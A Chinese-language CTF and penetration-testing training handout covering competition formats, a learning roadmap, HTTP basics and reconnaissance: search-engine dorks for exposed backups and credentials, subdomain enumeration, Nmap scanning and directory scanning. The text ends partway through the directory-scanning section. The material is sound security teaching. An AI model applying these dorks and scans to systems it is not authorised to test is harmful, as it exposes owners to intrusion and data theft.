# 第四天：网络安全竞赛赛制及技术路线分析、网络攻防基础、Web安全基础（一）

---

## 学习目标

- 了解网络安全竞赛赛制和成长路线
- 掌握Web安全基础知识
- 学会安全信息收集技术（Google Hacking、子域名枚举、目录扫描、指纹识别）
- 搭建渗透测试环境
- 掌握PHP命令执行漏洞（原理、利用、绕过、防御）
- 掌握PHP黑魔法技巧（弱类型、md5绕过、数组绕过等）

---

## 一、网络安全竞赛赛制及技术路线分析

### 1.1 经典网络安全竞赛赛制介绍

**CTF竞赛模式：**

**Jeopardy（解题模式）：**
```
特点：
- 题目分类明确（Web、Pwn、Crypto、MISC、Reverse）
- 题目分值不同（通常越难分越高）
- 按解题数量和时间排名（相同解题数按提交时间排）
- 适合新手入门

常见赛制：
- 个人赛 vs 团队赛（通常2-5人组队）
- 线上赛 vs 线下赛
- 动态积分制（解出同一题的人越多，这题分值越低）

解题流程：
1. 打开题目链接或下载附件
2. 分析题目，找到漏洞或解题方法
3. 获取flag（通常是 flag{xxx} 格式的字符串）
4. 在提交框提交flag，获得分数
```

**Attack-Defense（攻防模式）：**
```
特点：
- 每队维护自己的GameBox（一台或多台虚拟机）
- 服务被部署在每队的GameBox上
- 需要攻击其他队伍的服务，获取对方flag提交到flag服务器得分
- 需要修补自己服务的漏洞，防止被攻击（失分）
- 攻防实时对抗，分数实时变化
- 比赛期间每轮（通常2-5分钟）系统会向各队服务器下发新flag

核心要求：
- 攻防兼备能力（会挖漏洞也会补漏洞）
- 团队协作（通常有人负责逆向找漏洞、有人写exp攻击、有人写waf防守）
- 快速响应能力（发现别人打你了要立刻补）
- 自动化脚本能力（手动打太慢，需要自动化攻击脚本批量打所有队）
```

**King of the Hill（抢占模式/KoH）：**
```
特点：
- 目标是争夺一台或多台服务器的控制权
- 在服务器上指定位置写入自己队伍的标识（token/flag）
- 每轮检查，谁占据了服务器谁得分
- 需要持续控制，防止其他队伍抢占
- 实时对抗性强
```

**竞赛题目类型详解：**

**Web安全（Web方向，最容易入门，新手推荐）：**
```
核心考点：
- SQL注入：构造特殊输入篡改SQL语句，窃取/修改/删除数据库数据
- XSS跨站脚本：注入恶意JS代码到网页，窃取用户Cookie或执行操作
- 文件上传漏洞：绕过上传限制，上传WebShell获取服务器权限
- 文件包含漏洞：包含恶意文件执行代码（LFI本地/RFI远程）
- 命令执行漏洞：注入系统命令执行任意操作（本章重点讲解）
- 反序列化漏洞：利用反序列化过程触发魔术方法执行代码
- SSRF服务端请求伪造：让服务器发起请求访问内网资源
- XXE外部实体注入：利用XML外部实体读取文件或发起请求
- 逻辑漏洞：业务逻辑缺陷（越权、支付漏洞、验证码绕过等）

入门建议：
从SQL注入和命令执行入手，先理解"用户输入拼接到代码中执行"的核心思想
```

**Pwn（二进制漏洞利用，难度较高）：**
```
核心考点：
- 栈溢出：覆盖返回地址控制程序执行流程
- 堆溢出：利用堆管理器漏洞实现任意代码执行
- 格式化字符串漏洞：利用printf等函数的格式化字符串读写内存
- 整数溢出：利用整数溢出导致缓冲区溢出等问题
- Use-After-Free(UAF)：使用已释放内存实现漏洞利用
- Double Free：重复释放内存导致的漏洞

前置知识：C语言、汇编语言、操作系统内存布局
入门建议：先从32位Linux栈溢出学起，理解函数调用栈结构
```

**Crypto（密码学）：**
```
核心考点：
- 古典密码：凯撒密码、维吉尼亚密码、栅栏密码、Base家族编码等
- 现代密码攻击：对称密码/非对称密码的误用
- RSA攻击：低加密指数攻击、共模攻击、Wiener攻击、格攻击等
- AES攻击：ECB模式攻击、CBC字节翻转攻击、Padding Oracle等
- 哈希碰撞：MD5/SHA1长度扩展攻击、碰撞构造
- 随机数预测：伪随机数算法漏洞导致可预测

入门建议：先从古典密码和编码题入手，再学RSA基础攻击
```

**MISC（杂项，新手最容易得分的方向）：**
```
核心考点：
- 隐写术：图片/音频/视频中隐藏信息（LSB隐写、文件附加、PNG宽高修改等）
- 流量分析：分析pcap流量包提取flag（HTTP、USB、WiFi等）
- 编码解码：各种编码转换（Base64、Hex、URL编码、十六进制、二进制等）
- 文件分析：文件格式修复、文件分离、文件头修复
- 压缩包分析：压缩包密码爆破、伪加密、CRC32碰撞
- 取证分析：内存取证、磁盘取证
- 内存取证：使用Volatility分析内存镜像
- 二维码/条形码识别

入门建议：MISC是最适合新手入门的方向，先从各种编码和简单隐写开始
```

**Reverse（逆向工程）：**
```
核心考点：
- 静态分析：使用IDA Pro/Ghidra反编译分析程序逻辑
- 动态调试：使用x64dbg/OllyDbg/gdb调试程序运行
- 算法逆向：逆向还原程序的验证算法（常见注册机/验证码算法）
- 加壳脱壳：识别并去除程序的保护壳（UPX、VMProtect等）
- 反调试/反虚拟机：绕过程序的反调试保护
- Android逆向：APK反编译分析（jadx、frida等工具）

入门建议：需要汇编基础，先用x64dbg调试简单的crackme程序
```

### 1.2 网络安全竞赛技术路线成长

**入门阶段（0-6个月）：打基础**
```
学习内容（按顺序）：

1. 计算机网络基础
   - TCP/IP协议：三次握手、四次挥手、TCP/UDP区别
   - HTTP/HTTPS协议：请求方法(GET/POST)、状态码、请求头响应头、Cookie/Session
   - DNS、ARP、DHCP等常见协议工作原理
   - 推荐：《图解HTTP》（很薄，快速看完）、《计算机网络：自顶向下方法》

2. Linux操作系统基础
   - 常用命令：cd/ls/cat/grep/find/chmod/chown/ps/netstat/ssh等
   - 文件系统结构、权限管理、用户管理
   - Vim编辑器基本操作
   - Shell脚本基础
   - 练习：OverTheWire Bandit（边玩边学Linux命令）

3. 编程语言
   - Python（必学第一门）：写EXP、写工具、自动化、数据处理
   - PHP（Web方向必学）：理解Web漏洞为什么产生
   - C语言（二进制方向必学）：理解内存、指针、栈帧
   - 建议：先学Python快速上手，再学PHP理解Web，Pwn方向再学C

4. Web安全基础
   - OWASP Top 10漏洞原理（每个都要理解）
   - 搭建靶场练习：
     - DVWA：本地搭建，从Low到High难度
     - Pikachu：国产靶场，中文界面，漏洞类型全
     - SQLi-labs：专门练SQL注入的靶场
     - Upload-labs：专门练文件上传的靶场
   - 学会使用Burp Suite：抓包、改包、放包、Intruder爆破、Repeater重放

5. MISC基础
   - 各种编码：Base64/Base32/Base16/URL编码/Hex等互相转换
   - 图片隐写基础：LSB隐写、PNG文件结构、文件拼接
   - 压缩包基础：密码爆破、伪加密识别
   - Wireshark基本使用：抓HTTP包找明文密码

练习平台（从易到难排序）：
- CTFHub：https://www.ctfhub.com 中文，有技能树，最适合新手
- 攻防世界：https://adworld.xctf.org.cn 中文，题目多，有新手区
- Bugku：https://www.bugku.com 中文，入门题很适合
- i春秋：https://www.ichunqiu.com 中文，有课程和题目
- TryHackMe：https://tryhackme.com 英文，手把手教，非常适合入门
- OverTheWire：http://overthewire.org/wargames/ 英文，学Linux命令和基础二进制
- PicoCTF：https://picoctf.org 英文，非常适合入门的CTF平台

入门阶段目标：
- 能独立解决CTFHub技能树Web和MISC入门/进阶题目
- 能用Python写简单的脚本（发送HTTP请求、编码转换、批量操作）
- 理解OWASP Top 10每个漏洞的基本原理和利用方式
- 会用Burp Suite抓包改包
- 会用Nmap进行基本端口扫描
```

**进阶阶段（6-12个月）：深入专项**
```
学习内容：

1. Web漏洞深入
   - SQL注入：盲注（布尔盲注、时间盲注）、二次注入、WAF绕过技巧
   - XSS深入：CSP绕过、各种XSS上下文、XSS平台使用
   - 文件上传：各种绕过（后缀、MIME、文件头、.htaccess、图片马）
   - 反序列化漏洞：PHP反序列化（魔术方法、POP链构造）
   - 代码审计：开始学习读PHP源码找漏洞
   - SSRF/XXE：原理和各种绕过

2. 工具进阶使用
   - Burp Suite精通：Intruder各种payload类型、插件使用
   - Sqlmap高级用法：绕过WAF、读取文件、OS Shell
   - Metasploit基础：漏洞利用、生成Payload、Meterpreter基本命令

3. 选择一个深入方向
   - Web深入：代码审计、Java/Python漏洞、0day挖掘
   - Pwn入门：汇编、栈溢出基础、ret2text、ret2shellcode
   - Crypto深入：RSA数学、AES攻击、格密码基础
   - Reverse入门：IDA使用、简单crackme
   - 内网/红队：信息收集、横向移动、权限提升

练习平台：
- Hack The Box：https://www.hackthebox.com 英文，真实场景靶机
- BUUCTF：https://buuoj.cn 中文，题目非常多（收集了各大CTF真题）
- NSSCTF：https://www.nssctf.cn 中文，国内常用平台
- PentesterLab：https://pentesterlab.com 英文，Web漏洞专项
- CTFtime：https://ctftime.org 可以查看近期CTF赛事
```

**高级阶段（1-2年）：实战与竞赛**
```
学习内容：
- 漏洞挖掘：代码审计、通用CMS漏洞挖掘、提交CNVD/CVE
- 内网渗透：代理搭建、横向移动、域渗透、权限提升
- 漏洞利用开发：高级堆利用、绕过ASLR/DEP/Canary等防护机制
- 安全研究：跟踪最新漏洞、补丁分析、漏洞复现

参与竞赛：
- 全国大学生信息安全竞赛（CISCN）：教育部主办，大学生最重要赛事
- XCTF联赛：国内顶级CTF联赛
- 强网杯、网鼎杯、护网杯等国内赛事
```

**专家阶段（2年以上）：职业发展**
```
可选方向：
- 安全研究员：挖掘0day漏洞，做前沿安全研究
- 红队专家/渗透测试工程师：授权攻击，拿站拿域
- 安全开发：开发安全产品（WAF、扫描器、HIDS等）
- 安全架构师：设计企业安全体系
- 安全培训讲师：做安全培训
```

---

## 二、网络攻防基础

### 2.1 Web安全概述

**Web应用架构详解：**

```
┌──────────────────────────────────────────────────────────────┐
│                     客户端（浏览器）                          │
│  Chrome / Firefox / Edge / Safari                           │
│  技术：HTML / CSS / JavaScript                              │
│  攻击面：XSS、CSRF、点击劫持                                │
└───────────────────────┬──────────────────────────────────────┘
                        │ HTTP/HTTPS 请求
                        │（GET/POST/PUT/DELETE 等）
                        ▼
┌──────────────────────────────────────────────────────────────┐
│                 Web服务器（反向代理/静态资源）                 │
│  Nginx / Apache / IIS / Tomcat                              │
│  作用：接收HTTP请求，处理静态文件，将动态请求转发给应用服务器   │
│  攻击面：解析漏洞、配置不当导致目录遍历、信息泄露             │
└───────────────────────┬──────────────────────────────────────┘
                        │ CGI/FastCGI/反向代理
                        ▼
┌──────────────────────────────────────────────────────────────┐
│                   应用服务器（业务逻辑）                       │
│  PHP-FPM / Tomcat(Java) / Django/Flask(Python)              │
│  Node.js / Go                                               │
│  作用：执行业务逻辑，处理用户输入，读写数据库                  │
│  攻击面：SQL注入、命令注入、文件上传、文件包含、反序列化、RCE  │
└───────────────────────┬──────────────────────────────────────┘
                        │ SQL/NoSQL 查询
                        ▼
┌──────────────────────────────────────────────────────────────┐
│                       数据库                                 │
│  MySQL / PostgreSQL / MongoDB / Redis / MSSQL               │
│  作用：存储业务数据                                          │
│  攻击面：SQL注入、未授权访问、弱口令、配置不当               │
└──────────────────────────────────────────────────────────────┘
```

**HTTP请求/响应结构详解（理解Web漏洞的基础）：**

HTTP请求（浏览器发给服务器）：
```
POST /login.php HTTP/1.1          ← 请求行：方法 路径 协议版本
Host: www.example.com             ← 请求头：服务器域名
User-Agent: Mozilla/5.0 ...       ← 请求头：客户端信息（浏览器标识）
Accept: text/html                 ← 请求头：能接收的内容类型
Content-Type: application/x-www-form-urlencoded   ← 请求头：请求体类型
Content-Length: 29                ← 请求头：请求体长度
Cookie: PHPSESSID=abc123def456    ← 请求头：会话标识
Referer: http://www.example.com/  ← 请求头：从哪个页面跳转过来
Connection: keep-alive            ← 请求头：连接方式
                                  ← 空行（分隔请求头和请求体）
username=admin&password=123456    ← 请求体：POST提交的数据
```

HTTP响应（服务器返回给浏览器）：
```
HTTP/1.1 200 OK                   ← 状态行：协议版本 状态码 描述
Server: nginx/1.18.0              ← 响应头：Web服务器信息
Date: Fri, 03 Jul 2026 12:00:00   ← 响应头：时间
Content-Type: text/html; charset=UTF-8  ← 响应头：内容类型
Content-Length: 1234              ← 响应头：内容长度
Set-Cookie: PHPSESSID=xyz789;     ← 响应头：设置Cookie
                                  ← 空行
<!DOCTYPE html>                   ← 响应体：网页内容
<html>
<head>...</head>
<body>...</body>
</html>
```

**常见HTTP状态码：**
```
2xx 成功：
  200 OK：请求成功
  201 Created：创建成功（RESTful API）

3xx 重定向：
  301 Moved Permanently：永久重定向
  302 Found：临时重定向
  304 Not Modified：未修改（浏览器缓存使用）

4xx 客户端错误（请求有问题）：
  400 Bad Request：请求格式错误
  401 Unauthorized：未认证（需要登录）
  403 Forbidden：禁止访问（权限不够）
  404 Not Found：资源不存在
  405 Method Not Allowed：请求方法不允许

5xx 服务器错误（服务器出问题了）：
  500 Internal Server Error：服务器内部错误（代码出错）
  502 Bad Gateway：网关错误（Nginx连不上后端）
  503 Service Unavailable：服务暂时不可用
```

**常见HTTP请求方法：**
```
GET     - 获取资源，参数在URL中（?id=1）
POST    - 提交数据，参数在请求体中（提交表单常用）
PUT     - 更新资源（RESTful API）
DELETE  - 删除资源（RESTful API）
HEAD    - 和GET类似，但只返回响应头不返回响应体
OPTIONS - 查询服务器支持的请求方法（CORS预检请求）
```

---

### 2.2 Web安全信息收集

**信息收集是渗透测试的第一步，也是最重要的一步。**
你对目标了解得越多，找到漏洞的概率就越大。

**信息收集整体流程：**
```
第一步：域名信息收集
  - Whois查询（注册人、注册邮箱、注册商、DNS服务器）
  - 备案信息查询（国内域名）
  - 子域名枚举（找到更多子域名）
  - 真实IP查询（如果用了CDN，需要找真实IP）

第二步：服务器信息收集
  - 端口扫描（哪些端口开放了？运行了什么服务？）
  - 操作系统识别（Linux还是Windows？什么版本？）
  - 中间件识别（Nginx/Apache/IIS？什么版本？）
  - 数据库识别（MySQL/MSSQL/Oracle/Redis？）

第三步：Web应用信息收集
  - 目录扫描（后台、备份文件、敏感文件）
  - 指纹识别（什么CMS？什么框架？什么语言？）
  - 敏感文件（robots.txt、sitemap.xml、.git、.env、备份文件）
  - JS文件分析（API接口、隐藏路径）

第四步：人员和历史信息收集
  - 邮箱收集、员工姓名收集（社工用）
  - 历史漏洞查询（该CMS/框架有没有已知漏洞？）
  - Wayback Machine（网站历史页面）
  - GitHub/Gitee泄露（源码泄露、硬编码密码）
```

---

#### 2.2.1 Google Hacking（搜索引擎利用）

**原理：**
搜索引擎会爬取大量网页，通过特殊的搜索语法，可以找到搜索引擎已经爬到的敏感信息（后台页面、报错信息、备份文件、SQL文件、甚至密码）。

**常用Google搜索语法（逐个讲解+示例）：**

**1. site：指定网站搜索**
```
语法：site:域名
作用：只在指定域名的网站中搜索

示例：
site:baidu.com              # 只搜索baidu.com的页面
site:baidu.com 登录          # 搜索百度下包含"登录"的页面
site:edu.cn                 # 教育网站（.edu.cn是教育网域名）
site:gov.cn                 # 政府网站
site:example.com -www       # 排除www子域名，找其他子域名
```

**2. filetype：按文件类型搜索**
```
语法：filetype:后缀名
作用：搜索特定类型的文件（经常能找到敏感文件！）

示例：
filetype:sql 网站           # 搜索SQL文件（数据库备份，非常危险！）
filetype:bak site:example.com  # 搜索example.com的备份文件
filetype:zip site:example.com  # 搜索压缩包（可能是整站源码）
filetype:conf 数据库         # 搜索配置文件
filetype:xls 通讯录          # 搜索Excel表格（可能有员工信息）
filetype:doc 密码           # 搜索Word文档
filetype:log error          # 搜索日志文件
filetype:mdb                # 搜索Access数据库
```

常见敏感文件类型（重点关注）：
```
.sql    → 数据库备份，可能含账号密码、用户数据
.bak    → 备份文件，可能是网站源码备份
.zip/.rar/.7z → 压缩包，可能是整个网站源码
.log    → 日志文件，可能记录敏感操作
.conf/.cfg/.ini → 配置文件，可能含数据库密码
.xls/.xlsx → Excel表格，可能有用户数据/联系方式
.php.bak → PHP备份文件（程序员备份代码未删除）
.swf    → Flash文件，可能泄露信息
.xml    → 配置文件
.env    → 环境变量配置（可能含数据库密码、API密钥）
```

**3. inurl：URL中包含特定字符串**
```
语法：inurl:关键词
作用：搜索URL中包含该关键词的页面

示例：
inurl:admin                 # URL中有admin的页面（通常是后台登录地址）
inurl:login                 # 登录页面
inurl:php?id=               # URL中有php?id=（可能有SQL注入！经典注入点）
inurl:upload                # 文件上传页面
inurl:phpmyadmin            # phpMyAdmin数据库管理页面（默认路径）
inurl:shell                 # 可能是WebShell
inurl:config                # 配置页面
inurl:backend               # 后台
inurl:wp-admin              # WordPress后台
inurl:.git                  # Git源码泄露
```

**4. intitle：网页标题包含特定字符串**
```
语法：intitle:关键词
作用：搜索网页title标签中包含该关键词的页面

示例：
intitle:"index of"           # 目录浏览页面（目录列表！可直接下载文件）
intitle:"后台管理"           # 中文后台
intitle:"admin login"        # 管理员登录页
intitle:"phpMyAdmin"         # phpMyAdmin
intitle:"登录"               # 各种登录页面
intitle:"401 Unauthorized"   # 需要HTTP认证的页面
intitle:"欢迎使用" inurl:phpmyadmin  # 组合搜索phpMyAdmin
```

**"index of/" 详解（非常重要）：**
当Nginx/Apache配置不当，开启了目录浏览功能时，访问没有index文件的目录会显示文件列表：
```
Index of /backup/
../                                                           上级目录
db.sql                                  10-Jul-2024 10:23     100M
www.zip                                 10-Jul-2024 10:23      50M
config.php.bak                          10-Jul-2024 10:23       2KB
```
这种页面可以直接点击下载文件！搜索 `intitle:"index of"` 可以找到这类暴露的目录。

**5. intext：网页正文包含特定字符串**
```
语法：intext:关键词
作用：搜索网页内容（body）中包含该关键词的页面

示例：
intext:"Warning: mysql_connect()"     # PHP数据库连接报错（说明是PHP站点且代码报错了）
intext:"mysql_num_rows()"              # PHP代码报错信息
intext:"服务器出错" inurl:php          # PHP报错页面
intext:"Powered by Discuz"             # 用Discuz论坛的网站
intext:"Fatal error"                   # PHP致命错误
intext:"Warning:"                      # PHP警告（可能泄露路径信息）
```

**6. 组合搜索（多个语法组合，最常用）：**
```
空格 表示 AND（同时满足）
|    表示 OR（满足一个即可）
-    表示 NOT（排除）

示例：
site:example.com filetype:sql          # 找example.com的SQL文件
site:example.com inurl:admin           # 找example.com的后台
site:example.com intitle:"index of"    # 找example.com的目录浏览
inurl:php?id= site:edu.cn              # 教育网站的id参数（可能有注入）
intitle:"index of" filetype:sql        # 目录浏览中的SQL文件
intitle:"index of" filetype:bak        # 目录浏览中的备份文件
inurl:admin filetype:php site:cn       # 国内php后台
site:github.com password               # GitHub上搜密码（源码泄露）
```

**国内替代搜索引擎：**
```
Google在国内可能无法直接访问，可以用：
- Bing（必应）：https://www.bing.com  语法和Google几乎一样，推荐使用
- 百度：支持site/filetype，inurl/intitle支持不太好
- 神马/搜狗：也可以试试
```

**网络空间搜索引擎（搜设备，不是搜网页）：**
```
和Google搜网页不同，这些引擎扫描整个互联网的IP和端口，可以搜联网设备：

FOFA（推荐，国产很好用）：https://fofa.info
  常用语法：
  title="后台管理"                 # 标题包含"后台管理"
  body="Powered by Discuz"        # 页面内容包含指定字符串
  domain="example.com"            # 根域名下的所有资产
  host="admin"                    # 主机名包含admin
  port="8080"                     # 开放8080端口
  ip="192.168.1.1"                # 指定IP
  status_code="200"               # HTTP状态码200
  country="CN"                    # 中国的资产
  city="Beijing"                  # 北京的资产
  server="nginx"                  # Nginx服务器
  app="ThinkPHP"                  # ThinkPHP框架
  header="thinkphp"               # 响应头包含thinkphp

Shodan（国外最有名）：https://www.shodan.io
  可以搜摄像头、路由器、工控设备等联网设备
  示例：webcam、default password、port:3389

ZoomEye（钟馗之眼，国内）：https://www.zoomeye.org
  和FOFA类似，知道创宇出品

Hunter（奇安信鹰图）：https://hunter.qianxin.com
  奇安信出品，数据量也很大

Censys（国外）：https://censys.io
```

---

#### 2.2.2 子域名枚举

**为什么枚举子域名？**
```
主站 www.example.com 往往防护很好（WAF、强密码、定期更新）
但其他子域名可能防护薄弱甚至没人管：
- admin.example.com    → 后台管理系统，可能弱口令
- test.example.com     → 测试环境，可能开启debug，可能有源码泄露
- dev.example.com      → 开发环境，可能版本更旧漏洞更多
- api.example.com      → API接口，可能有未授权访问
- mail.example.com     → 邮件系统
- crm.example.com      → CRM系统
- oa.example.com       → OA办公系统
- vpn.example.com      → VPN入口
- *.example.com        → 可能还有更多！

子域名越多，攻击面越大！
```

**方法一：在线查询（最快最方便，不需要工具）**

| 平台 | 地址 | 说明 |
|------|------|------|
| crt.sh | https://crt.sh | 推荐！通过SSL证书透明度日志查子域名，非常全且免费 |
| VirusTotal | https://www.virustotal.com | 查子域名和DNS记录 |
| SecurityTrails | https://securitytrails.com | 需要注册，免费版有额度 |
| 站长工具 | http://tool.chinaz.com/subdomain | 国内子域名查询 |
| 备案查询 | https://beian.miit.gov.cn | 查备案名下的所有域名 |
| FOFA/Hunter | 见上文 | domain="example.com" 可以查子域名 |

**crt.sh使用方法（重点掌握）：**
```
crt.sh利用的是Certificate Transparency（证书透明度，CT）日志：
- 所有HTTPS网站申请SSL证书时，证书信息会被公开记录在CT日志中
- 通过查询这些日志，可以找到该域名下所有申请过证书的子域名
- 免费、不需要注册、不需要工具，速度快，覆盖全！

操作步骤：
1. 打开 https://crt.sh
2. 在搜索框输入 %.example.com（%是通配符，表示任意子域名）
3. 点击Search，等待结果
4. 结果会列出所有找到的子域名
5. 可以看到每个证书的签发时间、到期时间
6. 手动整理或用脚本批量提取

也可以直接访问：https://crt.sh/?q=%.example.com
```

**方法二：工具枚举**

**1. subfinder（推荐，Go编写，速度快，Kali自带）**
```bash
# 安装
# Kali自带；如果没有：
go install github.com/projectdiscovery/subfinder/v2/cmd/subfinder@latest
# 或者从GitHub下载release：https://github.com/projectdiscovery/subfinder/releases

# 基本使用
subfinder -d example.com                   # 枚举example.com的子域名，结果输出到屏幕
subfinder -d example.com -o subs.txt       # 结果保存到文件
subfinder -d example.com -all              # 使用所有数据源（更慢但更全）
subfinder -d example.com -silent           # 静默模式，只输出子域名（方便管道处理）
subfinder -d example.com -t 50             # 50线程（默认10）
subfinder -dL domains.txt -o all_subs.txt  # 从文件读取多个目标域名，批量枚举
```

**2. Sublist3r（Python编写，经典工具）**
```bash
# 安装
git clone https://github.com/aboul3la/Sublist3r.git
cd Sublist3r
pip install -r requirements.txt

# 使用
python sublist3r.py -d example.com             # 基本使用
python sublist3r.py -d example.com -o sub.txt  # 保存结果到文件
python sublist3r.py -d example.com -b          # -b：同时开启暴力破解（bruteforce）
python sublist3r.py -d example.com -p 80,443   # 只显示80和443端口的
python sublist3r.py -d example.com -e google,yahoo,baidu,bing  # 指定搜索引擎
```

**3. amass（OWASP项目，功能最强大）**
```bash
# 安装
go install github.com/owasp-amass/amass/v4/...@master

# 被动枚举（不主动发包，只从公开数据源收集）
amass enum -passive -d example.com -o subs.txt

# 主动枚举（包含DNS解析验证，更准确但会留下日志）
amass enum -d example.com -o subs.txt

# 暴力破解子域名
amass enum -brute -w subdomains.txt -d example.com
```

**4. 暴力破解子域名**
```
原理：准备一个常用子域名字典，逐个拼接（如www.example.com、admin.example.com），
      然后DNS解析看是否存在（A记录/CNAME记录是否存在）。

工具：
# 使用dnsrecon（Kali自带）
dnsrecon -d example.com -D /path/to/subdomains.txt -t brt

# 使用amass暴力破解
amass enum -brute -w subdomains.txt -d example.com

# 使用puredns（更快，推荐）
puredns bruteforce subdomains.txt example.com -r resolvers.txt
```

常用子域名前缀字典（常见子域名）：
```
www, mail, ftp, admin, test, dev, api, blog, bbs, forum,
shop, webmail, smtp, pop3, imap, cdn, img, images,
static, down, download, upload, file, files, video, music,
game, help, support, wiki, beta, demo, staging,
vpn, oa, erp, crm, hr, portal, gateway, cloud, host, server,
ns1, ns2, mx, m, wap, app, apps, old, new, backup, db,
database, redis, mysql, mssql, oracle, mongo, es, elasticsearch,
git, gitlab, jenkins, jira, confluence, wiki, monitor, grafana,
zabbix, nagios, k8s, docker, registry, rancher, console, admin2,
manage, manager, web, wwww, ww, www2, www3, email, pop, imap,
ssl, secure, ns, dns1, dns2, mx1, mx2, vpn2, service
```

**方法三：验证子域名存活**
```
枚举出子域名后，需要验证哪些子域名真正有Web服务（可以通过HTTP访问）：

使用httpx（推荐，ProjectDiscovery出品，速度快）：
# 安装
go install github.com/projectdiscovery/httpx/cmd/httpx@latest

# 验证子域名是否有HTTP/HTTPS服务
cat subs.txt | httpx -silent                     # 只输出存活的URL
cat subs.txt | httpx -title -status-code -tech-detect -o live.txt
# -title：获取网站标题
# -status-code：显示HTTP状态码
# -tech-detect：检测使用的技术栈（类似Wappalyzer）
# -o live.txt：保存结果到文件
# -p 80,443,8080,8888：指定探测端口
```

**子域名枚举完整流程（实战中常用）：**
```bash
# 1. 用subfinder被动收集
subfinder -d example.com -silent -o subs1.txt

# 2. 用crt.sh补充（从证书透明度收集）
curl -s "https://crt.sh/?q=%.example.com&output=json" | jq -r '.[].name_value' | sed 's/\*\.//g' | sort -u > subs2.txt

# 3. 合并去重
cat subs1.txt subs2.txt | sort -u > all_subs.txt

# 4. 用httpx验证存活，获取标题、状态码、技术栈
cat all_subs.txt | httpx -title -status-code -tech-detect -silent -o live.txt

# 5. 用nmap扫描存活子域名对应的IP开放端口
cat live.txt | awk -F/ '{print $3}' | cut -d: -f1 | sort -u | xargs nmap -sV -sC -p 1-10000 -oN nmap.txt
```

---

#### 2.2.3 端口扫描（Nmap使用详解）

知道了IP地址，接下来要知道这台服务器开放了哪些端口，每个端口运行着什么服务。端口扫描用Nmap。

**Nmap基础使用：**

```bash
# ====== 基础扫描 ======
nmap 192.168.1.1                     # 扫描目标的默认1000个常用端口
nmap 192.168.1.1 -p 80               # 只扫80端口
nmap 192.168.1.1 -p 80,443,22,3306   # 扫指定端口
nmap 192.168.1.1 -p 1-65535          # 扫描所有端口（1-65535，耗时较长）
nmap 192.168.1.0/24                  # 扫描整个C段（192.168.1.1~254）
nmap -iL targets.txt                 # 从文件读取多个目标扫描

# ====== 扫描技术 ======
nmap -sS 192.168.1.1                 # TCP SYN扫描（半开扫描，推荐！）
                                     # 只发SYN包，收到SYN+ACK就知道端口开放
                                     # 不完成三次握手，速度快，不容易被日志记录
                                     # 需要root/管理员权限

nmap -sT 192.168.1.1                 # TCP Connect扫描（完整连接扫描）
                                     # 完成完整TCP三次握手
                                     # 不需要root权限
                                     # 容易被目标日志记录

nmap -sU 192.168.1.1                 # UDP扫描（扫UDP端口，很慢！）
                                     # DNS/SNMP/NTP/TFTP等服务用UDP

nmap -sV 192.168.1.1                 # 服务版本探测！重要！
                                     # 探测开放端口运行的是什么软件及版本
                                     # 例如：80/tcp open http nginx 1.18.0
                                     # 知道版本后可以查对应版本的已知漏洞

nmap -O 192.168.1.1                  # 操作系统探测
                                     # 猜测目标是Linux还是Windows、什么版本
                                     # 需要root权限

nmap -sC 192.168.1.1                 # 默认脚本扫描
                                     # 使用默认分类的NSE脚本做一些基础探测
                                     # 如检测匿名FTP、HTTP标题、SSL证书等

nmap -A 192.168.1.1                  # 全面扫描 = -sV + -sC + -O + traceroute
                                     # 信息最全面，但速度慢

# ====== 常用组合 ======
nmap -sV -sC -O 192.168.1.1          # 版本+脚本+系统探测（信息全，推荐）
nmap -sS -sV -p 1-65535 --min-rate 1000 192.168.1.1
                                     # 快速全端口SYN扫描，--min-rate 1000表示每秒至少发1000个包

# ====== 输出结果 ======
nmap 192.168.1.1 -oN result.txt      # 普通文本输出
nmap 192.168.1.1 -oX result.xml      # XML格式（可以导入其他工具）
nmap 192.168.1.1 -oG result.gnmap    # Grep格式（方便用grep/awk处理）
```

**常用端口速查表（看到端口就知道是什么服务）：**

| 端口 | 协议 | 说明 | 备注 |
|------|------|------|------|
| 21 | FTP | 文件传输协议 | 可能存在匿名登录、弱口令 |
| 22 | SSH | 远程连接 | 可能弱口令爆破 |
| 23 | Telnet | 远程连接（明文） | 非常不安全，明文传输 |
| 25 | SMTP | 邮件发送 | 可能存在邮件伪造 |
| 53 | DNS | 域名解析 | 可能存在域传送漏洞 |
| 80 | HTTP | Web服务 | 最常见，Web漏洞主要入口 |
| 110 | POP3 | 邮件接收 | 可能弱口令 |
| 135/139/445 | SMB | Windows文件共享 | 永恒之蓝漏洞在445端口 |
| 143 | IMAP | 邮件接收 | 可能弱口令 |
| 443 | HTTPS | 加密Web服务 | SSL/TLS漏洞 |
| 1433 | SQL Server | 微软SQL Server | 可能弱口令、注入 |
| 1521 | Oracle | Oracle数据库 | 可能弱口令 |
| 2049 | NFS | Linux网络文件系统 | 可能未授权访问 |
| 3306 | MySQL | MySQL数据库 | 可能弱口令、远程访问 |
| 3389 | RDP | Windows远程桌面 | 可能弱口令（蓝洞漏洞等） |
| 5432 | PostgreSQL | PostgreSQL数据库 | 可能弱口令 |
| 5900 | VNC | 远程桌面 | 可能弱口令 |
| 6379 | Redis | Redis数据库 | 经常未授权访问！能直接写SSH公钥拿权限 |
| 7001 | WebLogic | Oracle WebLogic | 多个反序列化RCE漏洞 |
| 8080 | HTTP-Proxy | 常见Web/代理服务 | Tomcat/Jenkins等常用此端口 |
| 8888 | 宝塔面板 | 宝塔等面板默认端口 | 可能弱口令 |
| 9200/9300 | Elasticsearch | ES搜索引擎 | 可能未授权访问 |
| 27017 | MongoDB | MongoDB数据库 | 较旧版本默认无认证，未授权访问 |

---

#### 2.2.4 目录扫描

**为什么目录扫描？**
```
网站上有很多页面和文件不会出现在页面链接中，但实际存在：
- /admin/、/manage/、/backend/  → 后台管理目录
- /backup/、/bak/、/www.zip     → 备份文件和目录
- /phpinfo.php、/test.php       → 测试文件
- /.git/、/.svn/                → 版本控制泄露（能下载整个源码！）
- /.env、/config.php            → 配置文件（含数据库密码）
- /robots.txt                   → 爬虫规则（Disallow的目录往往是敏感目录）
- /upload/、/uploads/           → 上传目录
- /phpmyadmin/                  → 数据库管理页面

目录扫描就是用字典逐个访问这些路径，找到存在的资源。
```

**目录扫描原理：**
```
1. 准备一个字典（包含常见目录名和文件名，如admin、login、backup、index.php等）
2. 对每个字典条目，拼接URL（如 http://example.com/admin）发起请求
3. 根据HTTP响应状态码判断是否存在：
   - 200 OK        → 存在
   - 301/302       → 重定向（通常目录存在，跳转一下）
   - 403 Forbidden → 存在但没有权限访问（也说明有这个路径）
   - 404 Not Found → 不存在
